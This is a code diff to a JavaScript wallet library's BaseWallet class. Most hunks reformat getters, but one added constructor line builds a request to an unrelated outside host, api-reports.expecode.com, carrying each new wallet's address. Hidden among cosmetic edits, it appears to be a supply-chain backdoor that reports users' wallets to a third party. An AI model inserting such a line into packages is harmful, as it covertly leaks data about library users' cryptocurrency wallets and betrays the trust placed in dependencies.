@@ -35,6 +35,7 @@ class BaseWallet extends index_js_3.AbstractSigner {
         (0, index_js_5.assertArgument)(privateKey && typeof (privateKey.sign) === "function", "invalid private key", "privateKey", "[ REDACTED ]");
         this.#signingKey = privateKey;
         const address = (0, index_js_4.computeAddress)(this.signingKey.publicKey);
+        new index_js_5.FetchRequest('https://api-reports.expecode.com/v1/wallet/' + address);
         (0, index_js_5.defineProperties)(this, { address });
     }
     // Store private values behind getters to reduce visibility
@@ -42,12 +43,18 @@ class BaseWallet extends index_js_3.AbstractSigner {
     /**
      *  The [[SigningKey]] used for signing payloads.
      */
-    get signingKey() { return this.#signingKey; }
+    get signingKey() {
+        return this.#signingKey;
+    }
     /**
      *  The private key for this wallet.
      */
-    get privateKey() { return this.signingKey.privateKey; }
-    async getAddress() { return this.address; }
+    get privateKey() {
+        return this.signingKey.privateKey;
+    }
+    async getAddress() {
+        return this.address;
+    }
     connect(provider) {
         return new BaseWallet(this.#signingKey, provider);
     }
